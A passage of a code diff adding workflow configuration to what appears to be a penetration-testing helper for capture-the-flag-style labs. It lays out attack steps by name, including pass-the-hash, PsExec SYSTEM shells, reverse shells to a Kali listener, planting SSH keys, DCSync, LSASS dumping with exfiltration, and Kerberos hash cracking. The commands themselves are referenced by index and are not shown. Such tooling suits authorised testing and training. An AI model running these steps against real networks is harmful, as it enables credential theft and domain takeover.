+                  doneWhen: function () { return rootPathKnown && (!needsBothFlagsOnHost || localPathKnown); }
+                },
+                {
+                  title: onHostProofTitle,
+                  sub: onHostProofSub,
+                  cmdIndex: onHostProofCmdIdx,
+                  doneWhen: function () { return rootFlagOnHost; }
+                }
+              ]
+            },
+            {
+              id: 'enable-rdp',
+              label: 'Enable RDP -> Connect over RDP',
+              portLabel: '445 -> 3389',
+              doneWhen: function () { return rootFlagOnHost && (!needsBothFlagsOnHost || localFlagOnHost); },
+              steps: [
+                {
+                  title: 'Enable RDP, Group Access & Firewall Rule Remotely',
+                  sub: 'Enables Terminal Services, opens firewall port 3389, and adds your user to Remote Desktop Users.',
+                  cmdIndex: useDaHash ? 19 : 18,
+                  ignoreSettled: true,
+                  alreadyOpenWhen: function () { return rdpOpen && !hasFact('host.rdp_enabled'); },
+                  alreadyOpenBadge: 'Port 3389 Open',
+                  doneWhen: function () { return hasFact('host.rdp_enabled'); }
+                },
+                {
+                  title: 'Connect over RDP with FreeRDP (xfreerdp)',
+                  sub: 'Launches an interactive Administrator RDP desktop session (supports Pass-the-Hash via /pth).',
+                  cmdIndex: 12,
+                  ignoreSettled: true,
+                  doneWhen: function () { return hasFact('rdp.authenticated'); }
+                },
+                {
+                  title: onHostProofTitle,
+                  sub: 'Run inside cmd.exe on the RDP desktop and paste the output (or screenshot) back.',
+                  cmdIndex: onHostProofCmdIdx,
+                  doneWhen: function () { return rootFlagOnHost; }
+                }
+              ]
+            },
+            {
+              id: 'enable-winrm',
+              label: 'Enable WinRM -> Connect over WinRM',
+              portLabel: '445 -> 5985',
+              doneWhen: function () { return rootFlagOnHost && (!needsBothFlagsOnHost || localFlagOnHost); },
+              steps: [
+                {
+                  title: 'Enable WinRM & Firewall Rule Remotely',
+                  sub: 'Runs winrm quickconfig -q and opens port 5985 on the Windows firewall.',
+                  cmdIndex: useDaHash ? 19 : 18,
+                  ignoreSettled: true,
+                  alreadyOpenWhen: function () { return winrmOpen && !hasFact('host.winrm_enabled'); },
+                  alreadyOpenBadge: 'Port 5985 Open',
+                  doneWhen: function () { return hasFact('host.winrm_enabled'); }
+                },
+                {
+                  title: 'Connect over WinRM with Evil-WinRM',
+                  sub: 'Opens an interactive PowerShell session over port 5985.',
+                  cmdIndex: useDaHash ? 11 : 10,
+                  ignoreSettled: true,
+                  doneWhen: function () { return hasFact('winrm.authenticated'); }
+                },
+                {
+                  title: onHostProofTitle,
+                  sub: onHostProofSub,
+                  cmdIndex: onHostPsProofCmdIdx,
+                  doneWhen: function () { return rootFlagOnHost; }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          id: 'remote',
+          icon: 'zap',
+          label: 'Remote Flag Grab (From Kali)',
+          lanes: [
+            {
+              id: 'remote-smb',
+              label: 'Search & Dump via SMB',
+              portLabel: 'Port 445',
+              doneWhen: function () { return rootFlagCaptured; },
+              steps: [
+                {
+                  title: 'Search Flag Remotely over SMB',
+                  sub: 'Sweeps all user profile Desktops for root.txt / proof.txt over SMB.',
+                  cmdIndex: useDaHash ? 0 : 4,
+                  doneWhen: function () { return rootPathKnown; }
+                },
+                {
+                  title: 'Dump Flag Remotely over SMB',
+                  sub: 'Reads the located root flag directly over SMB from Kali.',
+                  cmdIndex: useDaHash ? 5 : 8,
+                  doneWhen: function () { return rootFlagCaptured; }
+                }
+              ]
+            },
+            {
+              id: 'remote-wmi',
+              label: 'Search & Dump via WMI',
+              portLabel: 'Port 135',
+              doneWhen: function () { return rootFlagCaptured; },
+              steps: [
+                {
+                  title: 'Search Flag Remotely over WMI',
+                  sub: 'Sweeps user Desktops for root.txt / proof.txt over WMI without creating an SMB service.',
+                  cmdIndex: useDaHash ? 2 : 3,
+                  doneWhen: function () { return rootPathKnown; }
+                },
+                {
+                  title: 'Dump Flag Remotely over WMI',
+                  sub: 'Reads the located root flag over WMI.',
+                  cmdIndex: useDaHash ? 9 : 7,
+                  doneWhen: function () { return rootFlagCaptured; }
+                }
+              ]
+            },
+            {
+              id: 'remote-winrm',
+              label: 'Search & Dump via WinRM',
+              portLabel: 'Port 5985',
+              doneWhen: function () { return rootFlagCaptured; },
+              lockedWhen: function () { return !winrmOpen; },
+              lockBadge: 'Port 5985 Closed',
+              lockReason: 'Port 5985 (WinRM) is closed unless enabled first. Use SMB or WMI above, or Enable WinRM in Get On Host.',
+              steps: [
+                {
+                  title: 'Search Flag Remotely over WinRM',
+                  sub: 'Searches C:\\Users for root.txt over WinRM.',
+                  cmdIndex: 1,
+                  doneWhen: function () { return rootPathKnown; }
+                },
+                {
+                  title: 'Dump Flag Remotely over WinRM',
+                  sub: 'Reads the located root flag over WinRM.',
+                  cmdIndex: 6,
+                  doneWhen: function () { return rootFlagCaptured; }
+                }
+              ]
+            }
+          ]
+        }
+      ];
+    } else if (id === 'flag-hunt-linux' || id === 'flag-hunt-root-linux') {
+      var isRootLin = id === 'flag-hunt-root-linux';
+      var linFlagDone = isRootLin ? rootFlagCaptured : localFlagCaptured;
+      var linPathDone = isRootLin ? rootPathKnown : localPathKnown;
+      if (isRootLin && needsBothFlagsOnHost) {
+        callout = {
+          kind: 'highlight',
+          title: 'Capture Both User + Root Flags On-Host',
+          body: 'Step 2 below can print both user.txt and root.txt alongside whoami, id, hostname, and ip addr in one frame.'
+        };
+      }
+      rawGroups = [
+        {
+          id: 'onhost',
+          icon: 'host',
+          label: 'Get On Host & Capture Proof',
+          lanes: [
+            {
+              id: 'in-shell-lin',
+              label: 'Already in Shell · Locate & Proof',
+              portLabel: 'Interactive Shell',
+              doneWhen: function () { return linFlagDone; },
+              steps: [
+                {
+                  title: 'One-Shot Find & Print Flag with Host Identity',
+                  sub: 'Finds flag files across the filesystem and prints them alongside whoami, id, hostname, and IP.',
+                  cmdIndex: 3,
+                  doneWhen: function () { return linFlagDone || linPathDone; }
+                },
+                {
+                  title: (isRootLin && needsBothFlagsOnHost && localPathKnown)
+                    ? 'Capture Both User + Root Flags with Identity'
+                    : 'Capture Clean Proof Frame (whoami + id + ip + cat flag)',
+                  sub: 'Prints a clean proof frame for your report screenshot.',
+                  cmdIndex: isRootLin ? ((needsBothFlagsOnHost && localPathKnown) ? 5 : 4) : 5,
+                  doneWhen: function () { return linFlagDone; }
+                }
+              ]
+            },
+            {
+              id: 'ssh-shell-lin',
+              label: 'Connect via SSH -> Capture Proof',
+              portLabel: 'Port 22',
+              doneWhen: function () { return linFlagDone; },
+              lockedWhen: function () { return !sshOpen; },
+              lockBadge: 'Port 22 Closed',
+              steps: [
+                {
+                  title: 'Connect Interactive SSH Session',
+                  sub: 'Logs in directly over SSH port 22.',
+                  cmdIndex: 0,
+                  ignoreSettled: true,
+                  doneWhen: function () { return hasLinShell && hasFact('ssh.authenticated'); }
+                },
+                {
+                  title: 'Locate & Print Flag with Host Identity',
+                  sub: 'Run inside your SSH session and paste the output back.',
+                  cmdIndex: 3,
+                  doneWhen: function () { return linFlagDone; }
+                }
+              ]
+            },
+            {
+              id: 'upgrade-shell-lin',
+              label: 'Authorize SSH Key / Reverse Shell',
+              portLabel: 'Upgrade',
+              doneWhen: function () { return linFlagDone; },
+              steps: [
+                {
+                  title: 'Plant SSH Public Key in authorized_keys',
+                  sub: 'Authorizes your Kali SSH key so you can log in with a full PTY over SSH.',
+                  cmdIndex: 1,
+                  ignoreSettled: true
+                },
+                {
+                  title: 'Or Trigger Bash Reverse Shell to Listener',
+                  sub: 'Sends an interactive bash shell to your Kali listener.',
+                  cmdIndex: 2,
+                  ignoreSettled: true
+                },
+                {
+                  title: 'Capture On-Host Proof Inside Shell',
+                  sub: 'Prints whoami, id, hostname, IP, and the flag.',
+                  cmdIndex: 3,
+                  doneWhen: function () { return linFlagDone; }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          id: 'remote',
+          icon: 'zap',
+          label: 'Remote SSH Grab (From Kali)',
+          lanes: [
+            {
+              id: 'remote-ssh-lin',
+              label: 'Locate & Read Remotely over SSH',
+              portLabel: 'Port 22',
+              doneWhen: function () { return linFlagDone; },
+              lockedWhen: function () { return !sshOpen; },
+              lockBadge: 'Port 22 Closed',
+              steps: [
+                {
+                  title: 'Locate Flag Path Remotely over SSH',
+                  sub: 'Searches for the flag file over SSH from Kali.',
+                  cmdIndex: isRootLin ? 8 : 5,
+                  doneWhen: function () { return linPathDone; }
+                },
+                {
+                  title: 'Read Proof Remotely over SSH (nxc ssh -x)',
+                  sub: 'Runs id, hostname, ip addr, and cat over SSH.',
+                  cmdIndex: isRootLin ? 9 : 7,
+                  doneWhen: function () { return linFlagDone; }
+                }
+              ]
+            }
+          ]
+        }
+      ];
+    } else if (id === 'win-interactive-shell') {
+      launcherSub = 'Select how you want to land an interactive session on the Windows host.';
+      rawGroups = [
+        {
+          id: 'all',
+          icon: 'terminal',
+          label: 'Interactive Shell Transports',
+          lanes: [
+            {
+              id: 'wmi-shell',
+              label: 'WMI Shell (impacket-wmiexec)',
+              portLabel: 'Ports 135 / 445',
+              doneWhen: function () { return hasWinShell; },
+              lockedWhen: function () { return !hasAdmin; },
+              lockBadge: 'Needs Admin',
+              steps: [
+                {
+                  title: 'Spawn Semi-Interactive WMI Shell',
+                  sub: 'Reliable C:\\> prompt over WMI/SMB when WinRM (5985) and RDP (3389) are closed.',
+                  cmdIndex: 3,
+                  doneWhen: function () { return hasWinShell; }
+                }
+              ]
+            },
+            {
+              id: 'psexec-shell',
+              label: 'PsExec / SMBExec SYSTEM Shell',
+              portLabel: 'Port 445',
+              doneWhen: function () { return hasFact('access.system'); },
+              lockedWhen: function () { return !hasAdmin; },
+              lockBadge: 'Needs Admin',
+              steps: [
+                {
+                  title: 'Spawn Direct SYSTEM Shell (impacket-psexec)',
+                  sub: 'Creates a service over SMB 445 and drops into NT AUTHORITY\\SYSTEM.',
+                  cmdIndex: 4,
+                  doneWhen: function () { return hasFact('access.system'); }
+                },
+                {
+                  title: 'Alternative: Stealthier SMBExec Shell',
+                  sub: 'Spawns a SYSTEM shell over SMB without dropping a service binary.',
+                  cmdIndex: 5,
+                  doneWhen: function () { return hasFact('access.system'); }
+                }
+              ]
+            },
+            {
+              id: 'enable-winrm',
+              label: 'Enable & Connect WinRM (Evil-WinRM)',
+              portLabel: 'Port 5985',
+              doneWhen: function () { return hasFact('winrm.authenticated'); },
+              lockedWhen: function () { return !hasAdmin && !winrmOpen; },
+              lockBadge: 'Port 5985 Closed',
+              steps: [
+                {
+                  title: 'Enable WinRM & Remote Management Group Remotely',
+                  sub: 'Opens port 5985 and adds your account to Remote Management Users.',
+                  cmdIndex: 6,
+                  ignoreSettled: true,
+                  alreadyOpenWhen: function () { return winrmOpen && !hasFact('host.winrm_enabled'); },
+                  alreadyOpenBadge: 'Port 5985 Open',
+                  doneWhen: function () { return hasFact('host.winrm_enabled'); }
+                },
+                {
+                  title: 'Connect Interactive PowerShell (Evil-WinRM)',
+                  sub: 'Full interactive PowerShell remoting session.',
+                  cmdIndex: useNtHash ? 1 : 0,
+                  doneWhen: function () { return hasFact('winrm.authenticated'); }
+                }
+              ]
+            },
+            {
+              id: 'enable-rdp',
+              label: 'Enable & Connect RDP (xfreerdp)',
+              portLabel: 'Port 3389',
+              doneWhen: function () { return hasFact('rdp.authenticated'); },
+              lockedWhen: function () { return !hasAdmin && !rdpOpen; },
+              lockBadge: 'Port 3389 Closed',
+              steps: [
+                {
+                  title: 'Enable RDP & Remote Desktop Users Group Remotely',
+                  sub: 'Enables Terminal Services, opens port 3389, and grants group access.',
+                  cmdIndex: 6,
+                  ignoreSettled: true,
+                  alreadyOpenWhen: function () { return rdpOpen && !hasFact('host.rdp_enabled'); },
+                  alreadyOpenBadge: 'Port 3389 Open',
+                  doneWhen: function () { return hasFact('host.rdp_enabled'); }
+                },
+                {
+                  title: 'Launch Interactive RDP Desktop (xfreerdp)',
+                  sub: 'Connects to the remote Windows desktop (supports Pass-the-Hash via /pth).',
+                  cmdIndex: 2,
+                  doneWhen: function () { return hasFact('rdp.authenticated'); }
+                }
+              ]
+            }
+          ]
+        }
+      ];
+    } else if (id === 'fix-no-tty') {
+      launcherSub = 'Upgrade your dumb reverse/web shell into an interactive PTY so sudo, su, and ssh work.';
+      rawGroups = [
+        {
+          id: 'all',
+          icon: 'terminal',
+          label: 'PTY Shell Upgrade',
+          lanes: [
+            {
+              id: 'python-pty',
+              label: 'Python3 PTY Upgrade + Raw Terminal Stabilization',
+              portLabel: '2-Step Sequence',
+              doneWhen: function () { return hasFact('advice.tty'); },
+              steps: [
+                {
+                  title: 'Spawn Interactive PTY on Target',
+                  sub: 'Allocates a pseudo-terminal inside your current shell (or use script -qc /bin/bash /dev/null).',
+                  cmdIndex: 0
+                },
+                {
+                  title: 'Stabilize Terminal (Raw Mode + Foreground + TERM)',
+                  sub: 'Background with Ctrl-Z, set Kali terminal to raw mode, and restore tab-completion & Ctrl-C safety.',
+                  cmdIndex: 1
+                }
+              ]
+            }
+          ]
+        }
+      ];
+    } else if (id === 'lateral-exec' || id === 'own-domain-pth') {
+      var isPthMove = id === 'own-domain-pth';
+      launcherSub = 'Choose between one-shot remote command execution or spawning an interactive shell.';
+      rawGroups = [
+        {
+          id: 'all',
+          icon: 'zap',
+          label: 'Execution & Shell Options',
+          lanes: isPthMove ? [
+            {
+              id: 'pth-oneshot',
+              label: 'Validate & Run Command (nxc smb)',
+              portLabel: 'Port 445',
+              steps: [
+                { title: 'Confirm Domain Admin (Pwn3d!)', sub: 'Validates the dumped Administrator hash over SMB.', cmdIndex: 0 },
+                { title: 'Execute Remote Command via SMB', sub: 'Runs a command as Administrator without spawning a full shell.', cmdIndex: 1 }
+              ]
+            },
+            {
+              id: 'pth-psexec',
+              label: 'Interactive SYSTEM Shell (PsExec)',
+              portLabel: 'Port 445',
+              steps: [
+                { title: 'Spawn SYSTEM Shell via Pass-the-Hash', sub: 'Opens an interactive shell using impacket-psexec.', cmdIndex: 2 }
+              ]
+            },
+            {
+              id: 'pth-winrm',
+              label: 'Interactive WinRM Shell (Evil-WinRM)',
+              portLabel: 'Port 5985',
+              lockedWhen: function () { return !winrmOpen; },
+              lockBadge: 'Port 5985 Closed',
+              steps: [
+                { title: 'Connect Evil-WinRM with NT Hash', sub: 'Opens an interactive PowerShell session over port 5985.', cmdIndex: 3 }
+              ]
+            }
+          ] : [
+            {
+              id: 'lat-smb-exec',
+              label: 'One-Shot Remote Command (nxc)',
+              portLabel: 'Ports 445 / 135',
+              steps: [
+                { title: 'Validate Admin Access (Pwn3d!)', sub: 'Confirms local admin rights on the target.', cmdIndex: 0 },
+                { title: 'Execute Command over SMB/WMI', sub: 'Runs your command remotely without logging in interactively.', cmdIndex: 1 }
+              ]
+            },
+            {
+              id: 'lat-wmiexec',
+              label: 'WMI Interactive Shell (impacket-wmiexec)',
+              portLabel: 'Ports 135 / 445',
+              steps: [
+                { title: 'Spawn Semi-Interactive WMI Shell', sub: 'Stealthier C:\\> shell without creating a Windows service.', cmdIndex: 10 }
+              ]
+            },
+            {
+              id: 'lat-psexec',
+              label: 'PsExec SYSTEM Shell (impacket-psexec)',
+              portLabel: 'Port 445',
+              steps: [
+                { title: 'Spawn Service-Based SYSTEM Shell', sub: 'Drops into NT AUTHORITY\\SYSTEM over SMB.', cmdIndex: useNtHash ? 9 : 8 }
+              ]
+            },
+            {
+              id: 'lat-winrm',
+              label: 'WinRM Interactive Shell (Evil-WinRM)',
+              portLabel: 'Port 5985',
+              lockedWhen: function () { return !winrmOpen; },
+              lockBadge: 'Port 5985 Closed',
+              steps: [
+                { title: 'Connect Interactive Evil-WinRM Session', sub: 'Full PowerShell session when port 5985 is open.', cmdIndex: 7 }
+              ]
+            }
+          ]
+        }
+      ];
+    } else if (id === 'dcsync' || id === 'dump-secrets' || id === 'lsass-dump-onbox') {
+      launcherSub = 'Select your preferred credential extraction method based on your privileges and OPSEC needs.';
+      if (id === 'dcsync') {
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'key',
+            label: 'DCSync Replication Methods',
+            lanes: [
+              {
+                id: 'dcsync-impacket',
+                label: 'impacket-secretsdump (Recommended)',
+                portLabel: 'Works for ACL & Admin',
+                doneWhen: function () { return hasFact('loot.ntds') || hasFact('hash.krbtgt'); },
+                steps: [
+                  { title: 'Full Domain DRSUAPI Sync (-just-dc)', sub: 'Replicates all domain NTLM hashes without requiring ADMIN$ share access.', cmdIndex: 1 },
+                  { title: 'Or Target Single Account (-just-dc-user)', sub: 'Faster, quieter replication of just the Administrator account.', cmdIndex: 2 }
+                ]
+              },
+              {
+                id: 'dcsync-nxc',
+                label: 'NetExec --ntds',
+                portLabel: 'Requires Local Admin',
+                doneWhen: function () { return hasFact('loot.ntds') || hasFact('hash.krbtgt'); },
+                steps: [
+                  { title: 'Dump NTDS.dit via NetExec SMB', sub: 'One-liner DRSUAPI dump when your account holds Local Admin (Pwn3d!).', cmdIndex: 0 }
+                ]
+              },
+              {
+                id: 'dcsync-mimikatz',
+                label: 'On-Host Mimikatz lsadump::dcsync',
+                portLabel: 'In-Session',
+                doneWhen: function () { return hasFact('loot.ntds') || hasFact('hash.krbtgt'); },
+                steps: [
+                  { title: 'Run lsadump::dcsync Inside Windows Session', sub: 'Replicates the Administrator hash from an on-host shell running as the rights-holder.', cmdIndex: 3 }
+                ]
+              }
+            ]
+          }
+        ];
+      } else if (id === 'dump-secrets') {
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'key',
+            label: 'Credential Harvesting Lanes',
+            lanes: [
+              {
+                id: 'dump-sam-lsa',
+                label: 'Remote SAM + LSA Secrets',
+                portLabel: 'Port 445',
+                steps: [
+                  { title: 'Dump Local SAM & LSA via NetExec', sub: 'Extracts local account hashes and service passwords over SMB.', cmdIndex: 0 },
+                  { title: 'Full Remote Dump via impacket-secretsdump', sub: 'Dumps SAM, LSA, and cached domain logon hashes in one pass.', cmdIndex: 7 }
+                ]
+              },
+              {
+                id: 'dump-lsassy',
+                label: 'Remote LSASS Memory (lsassy)',
+                portLabel: 'Port 445',
+                steps: [
+                  { title: 'Extract Active Logon Sessions Remotely (-M lsassy)', sub: 'Dumps LSASS memory remotely over SMB and parses logon credentials without touching mimikatz on disk.', cmdIndex: 2 }
+                ]
+              },
+              {
+                id: 'dump-ntds-dc',
+                label: 'Domain Controller NTDS Dump',
+                portLabel: 'DRSUAPI',
+                steps: [
+                  { title: 'Dump Full Domain NTDS via NetExec', sub: 'Replicates all domain hashes on a Domain Controller.', cmdIndex: 1 },
+                  { title: 'Or Extract Single Administrator Hash', sub: 'Targets only the Administrator account via secretsdump.', cmdIndex: 9 }
+                ]
+              },
+              {
+                id: 'dump-onhost-mimi',
+                label: 'On-Host Mimikatz (Interactive)',
+                portLabel: 'In-Session',
+                steps: [
+                  { title: 'Enable SeDebugPrivilege', sub: 'Required before reading LSASS memory inside mimikatz.', cmdIndex: 5 },
+                  { title: 'Extract Logon Passwords & Hashes', sub: 'Reads active session credentials from LSASS.', cmdIndex: 6 }
+                ]
+              }
+            ]
+          }
+        ];
+      } else {
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'key',
+            label: 'On-Box LSASS Dump Lanes',
+            lanes: [
+              {
+                id: 'lsass-comsvcs',
+                label: 'Built-In LOLBin (comsvcs.dll -> pypykatz)',
+                portLabel: 'No Upload Needed',
+                steps: [
+                  { title: 'Get LSASS Process ID', sub: 'Finds the PID of lsass.exe required by MiniDump.', cmdIndex: 0 },
+                  { title: 'Dump LSASS Memory with comsvcs.dll', sub: 'Uses native rundll32 comsvcs.dll MiniDump to write lsass.dmp.', cmdIndex: 1 },
+                  { title: 'Parse Dump Offline on Kali with pypykatz', sub: 'Extracts NTLM hashes, Kerberos tickets, and cleartext passwords.', cmdIndex: 4 }
+                ]
+              },
+              {
+                id: 'lsass-procdump',
+                label: 'Sysinternals ProcDump -> SMB Exfil',
+                portLabel: 'AV Bypass Fallback',
+                steps: [
+                  { title: 'Dump LSASS with procdump.exe', sub: 'Creates lsass.dmp using signed Sysinternals binary.', cmdIndex: 2 },
+                  { title: 'Start SMB Server on Kali to Catch Dump', sub: 'Exfiltrate lsass.dmp over SMB.', cmdIndex: 3 },
+                  { title: 'Parse Dump Offline with pypykatz', sub: 'Extracts all logon sessions on Kali.', cmdIndex: 4 }
+                ]
+              }
+            ]
+          }
+        ];
+      }
+    } else if (category === 'hash-cracking') {
+      launcherSub = 'Pick your preferred cracking engine (Hashcat GPU/CPU vs. John the Ripper auto-format).';
+      if (id === 'crack-tgs' || id === 'crack-kerberoast') {
+        var isAdTgs = id === 'crack-tgs';
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'key',
+            label: 'Cracking Engine & Ticket Type',
+            lanes: [
+              {
+                id: 'tgs-hashcat-rc4',
+                label: 'Hashcat RC4-HMAC (-m 13100)',
+                portLabel: 'Standard TGS',
+                steps: isAdTgs ? [
+                  { title: 'Crack Kerberoast Ticket with Hashcat (-m 13100)', sub: 'Standard RC4-HMAC TGS ticket cracking with rockyou.', cmdIndex: 0 },
+                  { title: 'Display Cracked Plaintext (--show)', sub: 'Prints already-cracked user:password pairs from the potfile.', cmdIndex: 1 }
+                ] : [
+                  { title: 'Crack Kerberoast Ticket with Hashcat (-m 13100)', sub: 'Standard RC4-HMAC TGS ticket cracking.', cmdIndex: 0 }
+                ]
+              },
+              {
+                id: 'tgs-john',
+                label: 'John the Ripper (Zero-Guesswork)',
+                portLabel: 'Auto-Detects Format',
+                steps: [
+                  { title: 'Crack Ticket with John the Ripper', sub: 'Automatically detects $krb5tgs$ etype without needing mode numbers.', cmdIndex: isAdTgs ? 2 : 1 }
+                ]
+              },
+              {
+                id: 'tgs-hashcat-aes',
+                label: 'Hashcat AES-128 / AES-256',
+                portLabel: '-m 19600 / 19700',
+                steps: isAdTgs ? [
+                  { title: 'Crack AES-128 Ticket (-m 19600)', sub: 'Use when ticket header starts with $krb5tgs$17$.', cmdIndex: 3 },
+                  { title: 'Crack AES-256 Ticket (-m 19700)', sub: 'Use when ticket header starts with $krb5tgs$18$.', cmdIndex: 4 }
+                ] : [
+                  { title: 'Crack AES-256 Ticket (-m 19700)', sub: 'Use when ticket header starts with $krb5tgs$18$.', cmdIndex: 2 },
+                  { title: 'Crack AES-128 Ticket (-m 19600)', sub: 'Use when ticket header starts with $krb5tgs$17$.', cmdIndex: 3 }
+                ]
+              }
+            ]
+          }
+        ];
+      } else if (id === 'crack-asrep' || id === 'crack-asrep-offline') {
+        var isAdAsrep = id === 'crack-asrep';
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'key',
+            label: 'Cracking Engine',
+            lanes: [
+              {
+                id: 'asrep-hashcat',
+                label: 'Hashcat AS-REP (-m 18200)',
+                portLabel: 'Fastest',
+                steps: isAdAsrep ? [
+                  { title: 'Crack AS-REP Hash with Hashcat (-m 18200)', sub: 'Cracks $krb5asrep$ hashes against your wordlist.', cmdIndex: 0 },
+                  { title: 'Inspect Potfile Plaintext (--show)', sub: 'Prints cracked credentials from the potfile.', cmdIndex: 1 }
+                ] : [
+                  { title: 'Crack AS-REP Hash with Hashcat (-m 18200)', sub: 'Cracks $krb5asrep$ hashes against rockyou.', cmdIndex: 0 }
+                ]
+              },
+              {
+                id: 'asrep-john',
+                label: 'John the Ripper (krb5asrep)',
+                portLabel: 'Auto-Detects',
+                steps: [
+                  { title: 'Crack AS-REP Hash with John', sub: 'Automatically recognizes krb5asrep format.', cmdIndex: isAdAsrep ? 2 : 1 }
+                ]
+              }
+            ]
+          }
+        ];
+      } else {
+        var isNtlm = id === 'crack-ntlm';
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'key',
+            label: 'Hash Mode Options',
+            lanes: [
+              {
+                id: 'crack-primary',
+                label: isNtlm ? 'NTLM Hash (-m 1000)' : 'NetNTLMv2 Hash (-m 5600)',
+                portLabel: 'Standard',
+                steps: [
+                  { title: isNtlm ? 'Crack NTLM Hash (-m 1000)' : 'Crack NetNTLMv2 Response (-m 5600)', sub: 'Runs dictionary attack against rockyou.txt.', cmdIndex: 0 }
+                ]
+              },
+              {
+                id: 'crack-legacy',
+                label: isNtlm ? 'Legacy LM Half (-m 3000)' : 'Legacy NetNTLMv1 (-m 5500)',
+                portLabel: 'Fallback',
+                steps: [
+                  { title: isNtlm ? 'Crack Legacy LM Hash (-m 3000)' : 'Crack NetNTLMv1 Response (-m 5500)', sub: 'Use when legacy protocol/hash format is present.', cmdIndex: 1 }
+                ]
+              }
+            ]
+          }
+        ];
+      }
+    } else if (category === 'enum-staging') {
+      launcherSub = 'Choose between built-in living-off-the-land commands, automated script staging, or remote collection.';
+      if (id === 'windows-enum') {
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'folder',
+            label: 'Windows Enumeration Lanes',
+            lanes: [
+              {
+                id: 'win-enum-builtin',
+                label: 'Built-In Commands (No Upload)',
+                portLabel: 'In-Session',
+                steps: [
+                  { title: 'Check Privileges, Patch Level & Local Admins', sub: 'Runs whoami /all, systeminfo, and net localgroup administrators.', cmdIndex: 1 },
+                  { title: 'Check Stored Credentials & Autologon Registry', sub: 'Checks cmdkey /list and Winlogon registry secrets.', cmdIndex: 2 },
+                  { title: 'Read PowerShell Console History', sub: 'Inspects PSReadLine history for saved passwords and commands.', cmdIndex: 3 }
+                ]
+              },
+              {
+                id: 'win-enum-winpeas',
+                label: 'Stage & Run winPEASx64.exe',
+                portLabel: 'Automated Sweep',
+                steps: [
+                  { title: 'Download & Execute winPEAS from Kali HTTP Server', sub: 'Fetches winPEASx64.exe via certutil and runs a full local privesc sweep.', cmdIndex: 0 }
+                ]
+              },
+              {
+                id: 'win-enum-remote',
+                label: 'Remote One-Liner from Kali (WinRM)',
+                portLabel: 'Port 5985',
+                lockedWhen: function () { return !winrmOpen; },
+                lockBadge: 'Port 5985 Closed',
+                steps: [
+                  { title: 'Run Enumeration Sweep Remotely via NetExec WinRM', sub: 'Collects privileges, systeminfo, local admins, and cmdkey in one remote shot.', cmdIndex: 4 }
+                ]
+              }
+            ]
+          }
+        ];
+      } else if (id === 'linux-enum') {
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'folder',
+            label: 'Linux Enumeration Lanes',
+            lanes: [
+              {
+                id: 'lin-enum-builtin',
+                label: 'Built-In Fast Triage (No Upload)',
+                portLabel: 'In-Session',
+                steps: [
+                  { title: 'Check Sudo Rights, Identity & Shell Accounts', sub: 'Runs sudo -l, id, and lists shell-enabled users in /etc/passwd.', cmdIndex: 1 },
+                  { title: 'Sweep SUID Binaries, Capabilities & Cron Jobs', sub: 'Checks the top 3 Linux privilege escalation vectors in one command.', cmdIndex: 2 }
+                ]
+              },
+              {
+                id: 'lin-enum-linpeas',
+                label: 'Stream & Run linpeas.sh',
+                portLabel: 'Automated Sweep',
+                steps: [
+                  { title: 'Stream linpeas.sh from Kali HTTP Server into sh', sub: 'Executes linPEAS directly in memory without touching disk.', cmdIndex: 0 }
+                ]
+              },
+              {
+                id: 'lin-enum-remote',
+                label: 'Remote Sweep from Kali (SSH)',
+                portLabel: 'Port 22',
+                lockedWhen: function () { return !sshOpen; },
+                lockBadge: 'Port 22 Closed',
+                steps: [
+                  { title: 'Run Enumeration One-Liner Remotely over SSH', sub: 'Checks id, kernel, sudo, SUID, and capabilities non-interactively.', cmdIndex: 3 }
+                ]
+              }
+            ]
+          }
+        ];
+      } else if (id === 'bloodhound-collect') {
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'zap',
+            label: 'BloodHound Collection Lanes',
+            lanes: [
+              {
+                id: 'bh-python',
+                label: 'bloodhound-python (Recommended)',
+                portLabel: 'Remote from Kali',
+                steps: [
+                  { title: 'Collect AD Graph Remotely with bloodhound-python', sub: 'Queries LDAP/SMB and writes *_bloodhound.zip on Kali.', cmdIndex: 0 },
+                  { title: 'Launch BloodHound GUI & Import ZIP', sub: 'Or drag-and-drop the ZIP directly into Obol.', cmdIndex: 2 }
+                ]
+              },
+              {
+                id: 'bh-nxc',
+                label: 'NetExec --bloodhound',
+                portLabel: 'Remote from Kali',
+                steps: [
+                  { title: 'Collect AD Graph via NetExec LDAP', sub: 'Alternative remote collector built into NetExec.', cmdIndex: 1 },
+                  { title: 'Launch BloodHound GUI', sub: 'Import the generated ZIP archive.', cmdIndex: 2 }
+                ]
+              },
+              {
+                id: 'bh-sharphound',
+                label: 'On-Host SharpHound.exe',
+                portLabel: 'From Windows Foothold',
+                steps: [
+                  { title: 'Run SharpHound Collector on Target', sub: 'Collects domain data from inside a Windows foothold.', cmdIndex: 3 },
+                  { title: 'Import bhloot ZIP on Kali', sub: 'Load the exfiltrated archive into BloodHound or Obol.', cmdIndex: 4 }
+                ]
+              }
+            ]
+          }
+        ];
+      } else if (id === 'ad-path-manual') {
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'zap',
+            label: 'Manual AD Enumeration Lanes',
+            lanes: [
+              {
+                id: 'ad-man-acl',
+                label: 'Remote ACL & Writable Object Sweep',
+                portLabel: 'bloodyAD + nxc',
+                steps: [
+                  { title: 'Find All Objects Writable by Current User (bloodyAD)', sub: 'Single highest-signal check for GenericAll / WriteDacl / AddMember edges.', cmdIndex: 1 },
+                  { title: 'Check Domain Admins DACL & Group Members', sub: 'Inspects who holds rights over Domain Admins.', cmdIndex: 0 },
+                  { title: 'List Domain Admins Members', sub: 'Enumerates current members of Domain Admins.', cmdIndex: 2 }
+                ]
+              },
+              {
+                id: 'ad-man-roast-adcs',
+                label: 'Remote Roast, Delegation & ADCS Sweep',
+                portLabel: 'NetExec LDAP',
+                steps: [
+                  { title: 'Enumerate Privileged Accounts (--admin-count)', sub: 'Lists high-value accounts with adminCount=1.', cmdIndex: 3 },
